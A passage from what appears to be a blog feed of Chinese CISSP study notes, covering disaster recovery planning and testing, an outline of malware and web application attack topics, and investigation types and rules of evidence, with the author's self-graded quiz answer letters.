的所有元素正常运行。</p><p>要确保所有职员都经过培训，通过模拟演练使新员工你尽快了解相应工作。 </p><h1 id="18-7-本章小结"><a href="#18-7-本章小结" class="headerlink" title="18.7 本章小结"></a>18.7 本章小结</h1><h1 id="考试要点"><a href="#考试要点" class="headerlink" title="考试要点"></a>考试要点</h1><h2 id="了解可能威胁组织的常见自然灾害"><a href="#了解可能威胁组织的常见自然灾害" class="headerlink" title="了解可能威胁组织的常见自然灾害"></a>了解可能威胁组织的常见自然灾害</h2><p>地震</p><p>洪水</p><p>暴风雨</p><p>火灾</p><p>海啸</p><p>火山爆发</p><h2 id="了解可能威胁组织的常见人为灾难"><a href="#了解可能威胁组织的常见人为灾难" class="headerlink" title="了解可能威胁组织的常见人为灾难"></a>了解可能威胁组织的常见人为灾难</h2><p>爆炸</p><p>电气火灾</p><p>恐怖行为</p><p>电力中断</p><p>其他公共设施故障</p><p>基础设施故障</p><p>硬件&#x2F;软件故障</p><p>罢工</p><p>盗窃</p><p>故意破坏</p><h2 id="熟悉常见的恢复设施"><a href="#熟悉常见的恢复设施" class="headerlink" title="熟悉常见的恢复设施"></a>熟悉常见的恢复设施</h2><p>常见的恢复设施包括冷站点、温站点、热站点、移动站点以及多站点。</p><p>必须理解每种设施的优缺点。</p><h2 id="解释相互援助协议的潜在优点及其没能在当今商业活动普遍实施的原因"><a href="#解释相互援助协议的潜在优点及其没能在当今商业活动普遍实施的原因" class="headerlink" title="解释相互援助协议的潜在优点及其没能在当今商业活动普遍实施的原因"></a>解释相互援助协议的潜在优点及其没能在当今商业活动普遍实施的原因</h2><p>虽然相互援助协议（MAA）提供了相对廉价的灾难恢复备用站点，但由于它们无法强制实施，因此未能普遍使用。</p><p>参与 MAA 的组织可能会由于相同的灾难而被迫关闭，并且 MAA 还会引发保密性问题。</p><h2 id="了解数据库备份技术"><a href="#了解数据库备份技术" class="headerlink" title="了解数据库备份技术"></a>了解数据库备份技术</h2><p>数据库备份得益于三种备份技术。</p><p><strong>电子链接</strong></p><p>用于将数据库备份传输到远程站点，是批量传输的一部分。</p><p><strong>远程日志处理</strong></p><p>用于更频繁的数据传输。</p><p><strong>远程镜像</strong></p><p>数据库事务可实时备份站点镜像。</p><h2 id="解释灾难恢复计划中使用的常见过程"><a href="#解释灾难恢复计划中使用的常见过程" class="headerlink" title="解释灾难恢复计划中使用的常见过程"></a>解释灾难恢复计划中使用的常见过程</h2><p>计划应该采取综合的规划方法，其中应该包括如下考虑因素：初始响应工作、相关人员、团队成员之间的沟通及其与内部和外部实体的沟通、响应工作评估和服务恢复。</p><p>灾难恢复计划还应该包括培训和意识培养工作，以确保人员了解他们的责任和经验教训，从而持续改进计划。</p><h2 id="了解灾难恢复计划测试的5种类型和对正常业务运营的影响"><a href="#了解灾难恢复计划测试的5种类型和对正常业务运营的影响" class="headerlink" title="了解灾难恢复计划测试的5种类型和对正常业务运营的影响"></a>了解灾难恢复计划测试的5种类型和对正常业务运营的影响</h2><p>5种类型：</p><p><strong>通读测试</strong></p><p>完全是纸面上的演练，不会影响业务运营</p><p><strong>结构化演练</strong></p><p>涉及项目组会议，不会影响业务运营</p><p><strong>模拟测试</strong></p><p>可能会暂停非关键的业务</p><p><strong>并行测试</strong></p><p>涉及重新部署人员，但不会影响日常运营</p><p><strong>完全中断测试</strong></p><p>涉及关闭主要系统以及将工作转移到恢复设施</p><h1 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h1><h2 id="业务连续性和灾难恢复计划关系"><a href="#业务连续性和灾难恢复计划关系" class="headerlink" title="业务连续性和灾难恢复计划关系"></a>业务连续性和灾难恢复计划关系</h2><p>业务连续性目标是防止业务中断</p><p>灾难恢复计划从业务连续性计划停止之处开始</p><p>组织可以选择制定业务连续性计划还是灾难恢复计划</p><p>灾难恢复计划指导组织恢复主设施的正常运行</p><h2 id="RPO、MTD、RTO、MTBF"><a href="#RPO、MTD、RTO、MTBF" class="headerlink" title="RPO、MTD、RTO、MTBF"></a>RPO、MTD、RTO、MTBF</h2><p><strong>RPO 恢复点目标</strong>：指定灾难期间可能丢失的最大数据量，用于指导备份策略。</p><p><strong>MTD 最大允许中断时间</strong>：与停机持续时间有关</p><p><strong>RTO 恢复时间目标</strong>：与停机持续时间有关</p><p><strong>MTBF 平均故障间隔时间</strong>：与故障事件的发生频率有关</p><h2 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h2><p>并行测试涉及将人员重新安置到备用恢复站点并执行站点激活程序。</p><h2 id="备份策略"><a href="#备份策略" class="headerlink" title="备份策略"></a>备份策略</h2><p>任何备份策略都必须包含过程中某个点的完整备份</p><p>完整备份和差异备份最多只需要恢复两个备份，恢复时间最快，备份时间最慢</p><p>完整备份和增量备份可能需要恢复很多个备份，恢复时间最慢，备份时间最快</p><h1 id="易错点-1"><a href="#易错点-1" class="headerlink" title="易错点"></a>易错点</h1><p>C✅</p><p>​DRP 的目标是尽快恢复正常的业务活动</p><p>​灾难恢复计划从业务连续性计划停止之处开始</p><p>​防止业务中断是业务连续性的目标</p><p>A❌ C</p><p>​恢复点时间 RPO 指定了灾难期间可能丢失的最大数据量，用于指导备份策略</p><p>​最大允许中断时间 MTD 和恢复时间目标 RTO 与停机持续时间有关，而不是与数据丢失量有关。</p><p>​平均故障间隔时间 MTBF 与故障事件的发生频率有关。</p><p>D✅</p><p>B✅</p><p>C✅</p><p>AD❌  ABD</p><p>​业务连续性计划的重点是在灾难发生时保持业务功能不中断。</p><p>​组织可以选择是制订业务连续性计划还是灾难恢复计划。</p><p>B✅</p><p>D✅</p><p>C✅</p><p>B✅</p><p>C✅</p><p>C✅</p><p>D✅</p><p>C❌ D</p><p>​并行测试涉及将人员重新安置到备份恢复站点并执行站点激活程序 </p><p>A✅</p><p>D✅</p><p>A✅</p><p>​差异备份始终存储最近一次完整备份以来修改的所有文件副本</p><p>B✅</p><p>A✅</p><p>D❌ B</p><p>​并行测试涉及将人员转移到恢复站点来加速运营，但负责执行业务的日常运营责任仍在主运营中心。</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>seccert</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>seccert</tag>
      
      <tag>cissp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>21-域3安全架构与工程+域7安全运营+域8软件开发安全-恶意代码和应用攻击</title>
    <link href="/2025/04/21/security/seccert/cissp/21-%E5%9F%9F3%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%B7%A5%E7%A8%8B+%E5%9F%9F7%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5+%E5%9F%9F8%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8-%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%92%8C%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB/"/>
    <url>/2025/04/21/security/seccert/cissp/21-%E5%9F%9F3%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%B7%A5%E7%A8%8B+%E5%9F%9F7%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5+%E5%9F%9F8%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8-%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%92%8C%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="21-1-恶意软件"><a href="#21-1-恶意软件" class="headerlink" title="21.1 恶意软件"></a>21.1 恶意软件</h1><p>恶意软件包括广泛的软件威胁，利用网络、操作系统、软件和物理安全漏洞对计算机系统散播恶意载荷。</p><p>某些恶意代码对象（如计算机病毒和特洛伊木马）依靠用户对计算机的不知情或不当使用在系统间传播。</p><p>其他一些恶意代码对象（例如蠕虫）依靠自身的力量在脆弱的系统间迅速传播。</p><h2 id="21-1-1-恶意代码的来源"><a href="#21-1-1-恶意代码的来源" class="headerlink" title="21.1.1 恶意代码的来源"></a>21.1.1 恶意代码的来源</h2><p>早期，恶意代码的编写者都是相当有经验（可能误入歧途）的软件开发人员，他们会为自己精心构思的、富有创意的恶意代码技术感到骄傲。</p><p>脚本小子使用的工具可能免费提供给那些具有更危险犯罪意图的人。</p><p>恶意软件开发的最新趋势是高级持续性威胁 APT 的兴起。</p><p>APT 攻击者和其他恶意软件作者之间的主要区别是，恶意软件开发人员通常掌握软件供应商不知道的零日漏洞。</p><p>APT 构建的恶意软件具有高度针对性，旨在只影响少量的敌方系统（通常少到 一个）。</p><h2 id="21-1-2-病毒"><a href="#21-1-2-病毒" class="headerlink" title="21.1.2 病毒"></a>21.1.2 病毒</h2><p>计算机病毒主要有两个功能：传播和有效载荷执行。</p><p>病毒编写者和反病毒技术人员之间已展开竞赛。</p><p>传播功能定义了病毒如何在系统间扩散，从而感染每一台计算机。</p><p>病毒的有效载荷执行病毒编写者想到的恶意活动，可能对系统或数据的保密性、完整性或可用性产生负面影响。</p><h3 id="1-病毒传播技术"><a href="#1-病毒传播技术" class="headerlink" title="1. 病毒传播技术"></a>1. 病毒传播技术</h3><p>病毒必须包含能在系统间进行传播的技术。</p><p>常见传播途径：交换磁盘、共享网络资源、发送电子邮件等其他共享数据手段。</p><h4 id="常见的-4-种传播技术"><a href="#常见的-4-种传播技术" class="headerlink" title="常见的 4 种传播技术"></a>常见的 4 种传播技术</h4><h5 id="主引导记录病毒"><a href="#主引导记录病毒" class="headerlink" title="主引导记录病毒"></a>主引导记录病毒</h5><p>主引导记录（master boot record，MBR）病毒是已知最早的病毒感染形式。</p><p>主引导记录病毒攻击 MBR –  可启动介质（如硬盘或 U 盘）上用于在计算机启动过程中加载操作系统的部分。</p><h3 id="2-病毒技术"><a href="#2-病毒技术" class="headerlink" title="2. 病毒技术"></a>2. 病毒技术</h3><h3 id="3-病毒恶作剧"><a href="#3-病毒恶作剧" class="headerlink" title="3. 病毒恶作剧"></a>3. 病毒恶作剧</h3><h2 id="21-1-3-逻辑炸弹"><a href="#21-1-3-逻辑炸弹" class="headerlink" title="21.1.3 逻辑炸弹"></a>21.1.3 逻辑炸弹</h2><h2 id="21-1-4-特洛伊木马"><a href="#21-1-4-特洛伊木马" class="headerlink" title="21.1.4 特洛伊木马"></a>21.1.4 特洛伊木马</h2><h2 id="21-1-5-蠕虫"><a href="#21-1-5-蠕虫" class="headerlink" title="21.1.5 蠕虫"></a>21.1.5 蠕虫</h2><h3 id="1-Code-Red-蠕虫"><a href="#1-Code-Red-蠕虫" class="headerlink" title="1. Code Red 蠕虫"></a>1. Code Red 蠕虫</h3><h3 id="2-震网病毒"><a href="#2-震网病毒" class="headerlink" title="2. 震网病毒"></a>2. 震网病毒</h3><h2 id="21-1-6-间谍软件与广告软件"><a href="#21-1-6-间谍软件与广告软件" class="headerlink" title="21.1.6 间谍软件与广告软件"></a>21.1.6 间谍软件与广告软件</h2><h2 id="21-1-7-勒索软件"><a href="#21-1-7-勒索软件" class="headerlink" title="21.1.7 勒索软件"></a>21.1.7 勒索软件</h2><h2 id="21-1-8-恶意脚本"><a href="#21-1-8-恶意脚本" class="headerlink" title="21.1.8 恶意脚本"></a>21.1.8 恶意脚本</h2><h2 id="21-1-9-零日攻击"><a href="#21-1-9-零日攻击" class="headerlink" title="21.1.9 零日攻击"></a>21.1.9 零日攻击</h2><h1 id="21-2-恶意软件预防"><a href="#21-2-恶意软件预防" class="headerlink" title="21.2 恶意软件预防"></a>21.2 恶意软件预防</h1><h2 id="21-2-1-易受恶意软件攻击的平台"><a href="#21-2-1-易受恶意软件攻击的平台" class="headerlink" title="21.2.1 易受恶意软件攻击的平台"></a>21.2.1 易受恶意软件攻击的平台</h2><h2 id="21-2-2-反恶意软件"><a href="#21-2-2-反恶意软件" class="headerlink" title="21.2.2 反恶意软件"></a>21.2.2 反恶意软件</h2><h2 id="21-2-3-完整性监控"><a href="#21-2-3-完整性监控" class="headerlink" title="21.2.3 完整性监控"></a>21.2.3 完整性监控</h2><h2 id="21-2-4-高级威胁保护"><a href="#21-2-4-高级威胁保护" class="headerlink" title="21.2.4 高级威胁保护"></a>21.2.4 高级威胁保护</h2><h1 id="21-3-应用程序攻击"><a href="#21-3-应用程序攻击" class="headerlink" title="21.3 应用程序攻击"></a>21.3 应用程序攻击</h1><h2 id="21-3-1-缓冲区溢出"><a href="#21-3-1-缓冲区溢出" class="headerlink" title="21.3.1 缓冲区溢出"></a>21.3.1 缓冲区溢出</h2><h2 id="21-3-2-检查时间到使用时间"><a href="#21-3-2-检查时间到使用时间" class="headerlink" title="21.3.2 检查时间到使用时间"></a>21.3.2 检查时间到使用时间</h2><h2 id="21-3-3-后门"><a href="#21-3-3-后门" class="headerlink" title="21.3.3 后门"></a>21.3.3 后门</h2><h2 id="21-3-4-特权提升和-rootkit"><a href="#21-3-4-特权提升和-rootkit" class="headerlink" title="21.3.4 特权提升和 rootkit"></a>21.3.4 特权提升和 rootkit</h2><h1 id="21-4-注入漏洞"><a href="#21-4-注入漏洞" class="headerlink" title="21.4 注入漏洞"></a>21.4 注入漏洞</h1><h2 id="21-4-1-SQL-注入攻击"><a href="#21-4-1-SQL-注入攻击" class="headerlink" title="21.4.1 SQL 注入攻击"></a>21.4.1 SQL 注入攻击</h2><h3 id="1-基于内容的盲注"><a href="#1-基于内容的盲注" class="headerlink" title="1. 基于内容的盲注"></a>1. 基于内容的盲注</h3><h3 id="2-基于计时的盲注"><a href="#2-基于计时的盲注" class="headerlink" title="2. 基于计时的盲注"></a>2. 基于计时的盲注</h3><h2 id="21-4-2-代码注入攻击"><a href="#21-4-2-代码注入攻击" class="headerlink" title="21.4.2 代码注入攻击"></a>21.4.2 代码注入攻击</h2><h2 id="21-4-3-命令注入攻击"><a href="#21-4-3-命令注入攻击" class="headerlink" title="21.4.3 命令注入攻击"></a>21.4.3 命令注入攻击</h2><h1 id="21-5-利用授权漏洞"><a href="#21-5-利用授权漏洞" class="headerlink" title="21.5 利用授权漏洞"></a>21.5 利用授权漏洞</h1><h2 id="21-5-1-不安全的直接对象引用"><a href="#21-5-1-不安全的直接对象引用" class="headerlink" title="21.5.1 不安全的直接对象引用"></a>21.5.1 不安全的直接对象引用</h2><h2 id="21-5-2-目录遍历"><a href="#21-5-2-目录遍历" class="headerlink" title="21.5.2 目录遍历"></a>21.5.2 目录遍历</h2><h2 id="21-5-3-文件包含"><a href="#21-5-3-文件包含" class="headerlink" title="21.5.3 文件包含"></a>21.5.3 文件包含</h2><h1 id="21-6-利用-Web-应用程序漏洞"><a href="#21-6-利用-Web-应用程序漏洞" class="headerlink" title="21.6 利用 Web 应用程序漏洞"></a>21.6 利用 Web 应用程序漏洞</h1><h2 id="21-6-1-跨站脚本"><a href="#21-6-1-跨站脚本" class="headerlink" title="21.6.1 跨站脚本"></a>21.6.1 跨站脚本</h2><h3 id="1-反射-XSS"><a href="#1-反射-XSS" class="headerlink" title="1. 反射 XSS"></a>1. 反射 XSS</h3><h3 id="2-存储-持续-XSS"><a href="#2-存储-持续-XSS" class="headerlink" title="2. 存储&#x2F;持续 XSS"></a>2. 存储&#x2F;持续 XSS</h3><h2 id="21-6-2-请求伪造"><a href="#21-6-2-请求伪造" class="headerlink" title="21.6.2 请求伪造"></a>21.6.2 请求伪造</h2><h3 id="1-跨站请求伪造"><a href="#1-跨站请求伪造" class="headerlink" title="1. 跨站请求伪造"></a>1. 跨站请求伪造</h3><h3 id="2-服务器端请求伪造"><a href="#2-服务器端请求伪造" class="headerlink" title="2. 服务器端请求伪造"></a>2. 服务器端请求伪造</h3><h2 id="21-6-3-会话劫持"><a href="#21-6-3-会话劫持" class="headerlink" title="21.6.3 会话劫持"></a>21.6.3 会话劫持</h2><h1 id="21-7-应用程序安全控制"><a href="#21-7-应用程序安全控制" class="headerlink" title="21.7 应用程序安全控制"></a>21.7 应用程序安全控制</h1><h2 id="21-7-1-输入验证"><a href="#21-7-1-输入验证" class="headerlink" title="21.7.1 输入验证"></a>21.7.1 输入验证</h2><h2 id="21-7-2-Web-应用程序防火墙"><a href="#21-7-2-Web-应用程序防火墙" class="headerlink" title="21.7.2 Web 应用程序防火墙"></a>21.7.2 Web 应用程序防火墙</h2><h2 id="21-7-3-数据库安全"><a href="#21-7-3-数据库安全" class="headerlink" title="21.7.3 数据库安全"></a>21.7.3 数据库安全</h2><h3 id="1-参数化查询和存储过程"><a href="#1-参数化查询和存储过程" class="headerlink" title="1. 参数化查询和存储过程"></a>1. 参数化查询和存储过程</h3><h3 id="2-混淆和伪装"><a href="#2-混淆和伪装" class="headerlink" title="2. 混淆和伪装"></a>2. 混淆和伪装</h3><h2 id="21-7-4-代码安全"><a href="#21-7-4-代码安全" class="headerlink" title="21.7.4 代码安全"></a>21.7.4 代码安全</h2><h3 id="1-代码签名"><a href="#1-代码签名" class="headerlink" title="1. 代码签名"></a>1. 代码签名</h3><h3 id="2-代码重用"><a href="#2-代码重用" class="headerlink" title="2. 代码重用"></a>2. 代码重用</h3><h3 id="3-软件多样性"><a href="#3-软件多样性" class="headerlink" title="3. 软件多样性"></a>3. 软件多样性</h3><h3 id="4-代码仓库"><a href="#4-代码仓库" class="headerlink" title="4. 代码仓库"></a>4. 代码仓库</h3><h3 id="5-完整性度量"><a href="#5-完整性度量" class="headerlink" title="5. 完整性度量"></a>5. 完整性度量</h3><h3 id="6-应用程序韧性"><a href="#6-应用程序韧性" class="headerlink" title="6. 应用程序韧性"></a>6. 应用程序韧性</h3><h1 id="21-8-安全编码实践"><a href="#21-8-安全编码实践" class="headerlink" title="21.8 安全编码实践"></a>21.8 安全编码实践</h1><h2 id="21-8-1-源代码注释"><a href="#21-8-1-源代码注释" class="headerlink" title="21.8.1 源代码注释"></a>21.8.1 源代码注释</h2><h2 id="21-8-2-错误处理"><a href="#21-8-2-错误处理" class="headerlink" title="21.8.2 错误处理"></a>21.8.2 错误处理</h2><h2 id="21-8-3-硬编码凭证"><a href="#21-8-3-硬编码凭证" class="headerlink" title="21.8.3 硬编码凭证"></a>21.8.3 硬编码凭证</h2><h2 id="21-8-4-内存管理"><a href="#21-8-4-内存管理" class="headerlink" title="21.8.4 内存管理"></a>21.8.4 内存管理</h2><h3 id="1-资源耗尽"><a href="#1-资源耗尽" class="headerlink" title="1. 资源耗尽"></a>1. 资源耗尽</h3><h3 id="2-指针解引用"><a href="#2-指针解引用" class="headerlink" title="2. 指针解引用"></a>2. 指针解引用</h3><h1 id="21-9-本章小结"><a href="#21-9-本章小结" class="headerlink" title="21.9 本章小结"></a>21.9 本章小结</h1><h1 id="21-10-考试要点"><a href="#21-10-考试要点" class="headerlink" title="21.10 考试要点"></a>21.10 考试要点</h1><h2 id="理解病毒使用的传播技术"><a href="#理解病毒使用的传播技术" class="headerlink" title="理解病毒使用的传播技术"></a>理解病毒使用的传播技术</h2><p>病毒使用 4 种主要的传播技术渗透系统并传播恶意载荷。</p><p>4种技术是：</p><p>文件感染病毒</p><p>服务注入病毒</p><p>主引导记录病毒</p><p>宏病毒</p><p>需要理解这些技术以有效地确保网络上的系统免受恶意代码的侵犯。</p><h2 id="解释勒索软件造成的威胁"><a href="#解释勒索软件造成的威胁" class="headerlink" title="解释勒索软件造成的威胁"></a>解释勒索软件造成的威胁</h2><p>勒索软件使用传统的恶意软件技术感染系统，然后使用只有攻击者知道的密钥加密该系统上的数据。接着，攻击者要求受害者支付赎金以换取解密密钥。</p><h2 id="知道反病毒软件包如何检测已知病毒"><a href="#知道反病毒软件包如何检测已知病毒" class="headerlink" title="知道反病毒软件包如何检测已知病毒"></a>知道反病毒软件包如何检测已知病毒</h2><p>大多数反病毒程序使用特征检测算法寻找已知病毒。</p><p>为防范新出现的病毒，必须定期更新病毒定义文件。</p><p>基于行为的检测监控目标用户和系统的异常活动，并对其进行阻止或标记以供后续调查。</p><h2 id="解释用户和实体行为分析（UEBA）的功能"><a href="#解释用户和实体行为分析（UEBA）的功能" class="headerlink" title="解释用户和实体行为分析（UEBA）的功能"></a>解释用户和实体行为分析（UEBA）的功能</h2><p>UEBA 工具会生成个人行为文档，然后监控用户行为与这些文档记录的偏差，这些偏差可能表明存在恶意活动或账户泄露的情况。</p><h2 id="熟悉各种应用程序攻击，攻击者用它们编写拙劣的软件"><a href="#熟悉各种应用程序攻击，攻击者用它们编写拙劣的软件" class="headerlink" title="熟悉各种应用程序攻击，攻击者用它们编写拙劣的软件"></a>熟悉各种应用程序攻击，攻击者用它们编写拙劣的软件</h2><p>应用程序攻击是现代计算面临的最大威胁之一。</p><p>攻击者还利用缓冲区溢出、后门、TOC&#x2F;TOU 漏洞以及 rootkit 来获得对系统的非法访问。</p><p>安全专业人员必须对每种攻击和相关对策有清晰的理解。</p><h2 id="理解常见-Web-应用程序的漏洞及对策"><a href="#理解常见-Web-应用程序的漏洞及对策" class="headerlink" title="理解常见 Web 应用程序的漏洞及对策"></a>理解常见 Web 应用程序的漏洞及对策</h2><p>由于许多应用程序转移到了 Web 上，开发人员和安全专业人员必须了解这类存在于当今环境的新型攻击，以及如何防范它们。</p><p>两个最常见的例子是跨站脚本（XSS）攻击和 SQL 注入攻击。</p><h1 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h1><p>备份</p><p>TOCTTOU</p><p>逻辑炸弹、特洛伊木马、蠕虫、病毒</p><p>D✅</p><p>B✅</p><p>B❌</p><p>​从头开始重建系统，不能恢复数据</p><p>A✅</p><p>B✅</p><p>B✅</p><p>D✅</p><p>C✅</p><p>A✅</p><p>​逻辑炸弹在某些条件得到满足后才发送其恶意有效载荷</p><p>​蠕虫是恶意代码对象，在系统之间自行移动</p><p>​病毒需要某些类型的人工干预</p><p>​特洛伊木马伪装成有用的软件，但在安装后执行恶意功能</p><p>D✅</p><p>B✅</p><p>A❌ C</p><p>​加密恶意软件专门是窃取计算能力并利用来挖掘加密货币。</p><p>​远程访问特洛伊木马 RAT 旨在授予攻击者对系统的远程管理权限</p><p>​潜在不需要的程序 PUP 是最初由用户批准但随后不需要的操作的任何类型软件。</p><p>A✅</p><p>ABD✅</p><p>B✅</p><p>A✅</p><p>C❌ B</p><p>​后门是没有文档的命令序列，允许了解后门的人绕过正常的访问控制</p><p>​特权提升攻击（如 rootkit 执行的攻击）试图将访问权限从普通用户账户提升为管理员账户。</p><p>​缓冲区溢出将多余的输入放在字段中，试图执行攻击者提供的代码</p><p>D✅</p><p>D✅</p><p>D❌ </p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>seccert</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>seccert</tag>
      
      <tag>cissp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>19-域1安全风险与管理+域7安全运营-调查和道德</title>
    <link href="/2025/04/21/security/seccert/cissp/19-%E5%9F%9F1%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%E4%B8%8E%E7%AE%A1%E7%90%86+%E5%9F%9F7%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5-%E8%B0%83%E6%9F%A5%E5%92%8C%E9%81%93%E5%BE%B7/"/>
    <url>/2025/04/21/security/seccert/cissp/19-%E5%9F%9F1%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%E4%B8%8E%E7%AE%A1%E7%90%86+%E5%9F%9F7%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5-%E8%B0%83%E6%9F%A5%E5%92%8C%E9%81%93%E5%BE%B7/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="19-1-调查"><a href="#19-1-调查" class="headerlink" title="19.1 调查"></a>19.1 调查</h1><h2 id="19-1-1-调查的类型"><a href="#19-1-1-调查的类型" class="headerlink" title="19.1.1 调查的类型"></a>19.1.1 调查的类型</h2><h3 id="1-行政调查"><a href="#1-行政调查" class="headerlink" title="1.行政调查"></a>1.行政调查</h3><p>行政调查属于内部调查。</p><p>检查业务问题或违反组织政策的行为。</p><p>行政调查可以作为技术故障排除工作的一部分或支持其他管理过程。</p><p>行政调查可能会迅速转变为另一种类型的调查，例如发现入侵行为转变为刑事调查。</p><p>运营型调查对信息收集的标准比较宽松，仅针对内部业务目标，不需要证据，解决问题是首要目标。</p><p>运营型调查需要进行根本原因分析，强调需要补救的问题，以防止类似事件再次发生。</p><h3 id="2-刑事调查"><a href="#2-刑事调查" class="headerlink" title="2.刑事调查"></a>2.刑事调查</h3><p>刑事调查通常由执法者进行，是针对违法行为的调查。</p><p>刑事调查的结果是指控犯罪嫌疑人以及在刑事法庭上起诉。</p><p>刑事调查必须遵循严格的证据收集和保存流程。</p><h3 id="3-民事调查"><a href="#3-民事调查" class="headerlink" title="3.民事调查"></a>3.民事调查</h3><p>民事调查通常不涉及执法，但涉及让内部员工-法务和外部顾问代表法律团队工作。</p><p>民事案件只要求能够说明调查结果是可信赖的。</p><p>民事调查的证据收集标准不像刑事调查那么严格。</p><h3 id="4-监管调查"><a href="#4-监管调查" class="headerlink" title="4.监管调查"></a>4.监管调查</h3><p>政府机构在他们认为个人或企业已经违法行政法规时会执行监管调查。</p><p>监管调查的范围比较广泛，常由政府工作人员执行。</p><h3 id="5-行业标准"><a href="#5-行业标准" class="headerlink" title="5.行业标准"></a>5.行业标准</h3><p>基于行业标准的监管调查，例如：支付卡行业数据安全标准 PCI DSS 。</p><p>存在面临罚款或其他制裁的风险。</p><p>对于违反行业标准的调查，应该以与监管调查类似的方式对待。</p><h3 id="6-电子取证"><a href="#6-电子取证" class="headerlink" title="6.电子取证"></a>6.电子取证</h3><p>诉讼过程中，任何一方都有责任保留与案件相关的证据，并在取证过程中与对方分享信息。</p><p>取证过程应用于纸质档案和电子记录，电子取证（eDiscovery）。</p><p>电子取证参考模型（EDRM）描述了取证的标准过程，共 9 个方面：</p><p><strong>（1）信息治理</strong>  </p><p>确保信息系统针对将来的取证妥善管理信息</p><p><strong>（2）识别</strong>  当组织认为有可能发生诉讼时，要确定可回应取证要求的信息</p><p><strong>（3）保存</strong>  确保潜在的取证信息不会受到篡改或删除</p><p><strong>（4）收集</strong>  将用于电子取证过程的相关信息收集起来</p><p><strong>（5）处理</strong>  过滤收集到的信息并对无关信息进行“粗剪”，减少需要详细检查的信息</p><p><strong>（6）检查</strong>  检查剩下的信息，确定哪些信息是与取证请求相关的，并移除受律师-客户特权保护的信息</p><p><strong>（7）分析</strong>  对剩余信息的内容和上下文进行更深入的检查</p><p><strong>（8）产生</strong>  用标准格式生成需要与他人共享的信息，并将其交给其他方</p><p><strong>（9）呈现</strong>  向证人、法院和其他当事方展示信息</p><h2 id="19-1-2-证据"><a href="#19-1-2-证据" class="headerlink" title="19.1.2 证据"></a>19.1.2 证据</h2><p>为成功起诉犯罪行为，起诉律师必须提供足够的证据来证明某个人的罪行超出合理怀疑。</p><h3 id="1-可采纳的证据"><a href="#1-可采纳的证据" class="headerlink" title="1.可采纳的证据"></a>1.可采纳的证据</h3><p>法庭可采纳的证据必须满足下列三个要去：</p><ul><li>证据必须与确定事实相关</li><li>证据要确定的事实对本案来说是必要的，也就是相关联的。</li><li>证据必须有作证能力，必须是合法获得的。</li></ul><h3 id="2-证据的类型"><a href="#2-证据的类型" class="headerlink" title="2.证据的类型"></a>2.证据的类型</h3><h4 id="实物证据"><a href="#实物证据" class="headerlink" title="实物证据"></a>实物证据</h4><p>实物证据（real evidence）也被称为客观证据，包括那些可能会被带上法庭的物品。</p><p>例如：</p><p>凶器、衣物或其他有形物品</p><p>没收的计算机设备、带指纹的键盘、硬盘</p><p>DNA</p><h4 id="书面证据"><a href="#书面证据" class="headerlink" title="书面证据"></a>书面证据</h4><p>书面证据（document evidence）包括所有被带上法庭用于证明事实的书面内容。</p><p>书面证据也必须经过验证。</p><p><strong>特别应用于书面证据的规则</strong></p><ul><li><p>最佳证据规则（best evidence rule）</p><p>当文档被用于法庭程序的证据时，必须提供原始文档。</p></li><li><p>口头证据规则（parol evidence rule）</p><p>当双方的协议以书面形式记载下来时，假定书面文档包含所有协议条款，并且口头协议不可修改书面协议。</p></li></ul><p>书面证明满足重要性、作证能力以及相关性要求，且符合最佳证据规则和口头证据规则，就可以被法庭采纳。</p><p>当标记证据以保护证据链时，标签应该包含的信息：</p><ul><li>证据的一般性描述</li><li>证据收集的时间和日期</li><li>证据收集来源的确切位置</li><li>证据收集人员的姓名</li><li>证据收集的相关环境</li></ul><h4 id="言辞证据"><a href="#言辞证据" class="headerlink" title="言辞证据"></a>言辞证据</h4><p>言辞证据（testimonial evidence），是包含证人证词的证据。</p><p>证词既可以是法庭上的口头证词，也可以是记录下来的书面证词。</p><h4 id="演示证据"><a href="#演示证据" class="headerlink" title="演示证据"></a>演示证据</h4><p>演示证据是用来支持言辞证据的证据。</p><p>演示证据中的条目可能不会被采纳证据，用于帮助证人解释概念或澄清问题。</p><p>演示证据必须有助于陪审团理解案情。</p><h3 id="3-工作、证据收集和取证程序"><a href="#3-工作、证据收集和取证程序" class="headerlink" title="3.工作、证据收集和取证程序"></a>3.工作、证据收集和取证程序</h3><p>收集数字证据应该由专业取证技术人员进行。</p><p>收集数字证据的 6 条原则：</p><ul><li>处理数字证据时，必须应用所有通用的司法和程序原则。</li><li>收集数字证据时，所采取的行动不应该改变证据。</li><li>某人有必要使用原始数字证据时，应当接受有针对性的培训。</li><li>与收集、访问、存储或转移数字证据有关的所有活动都应当被完整记录和保留，并可供审查。</li><li>在数字证据被某人掌握之后，应当对与数字证据有关的所有活动负责。</li><li>所有负责收集、访问、存储或转移数字证据的机构都应该有责任遵守上述原则。</li></ul><p>取证时，必须保留原来的证据。</p><p>在分析数字证据时，最好使用副本。</p><h4 id="介质分析"><a 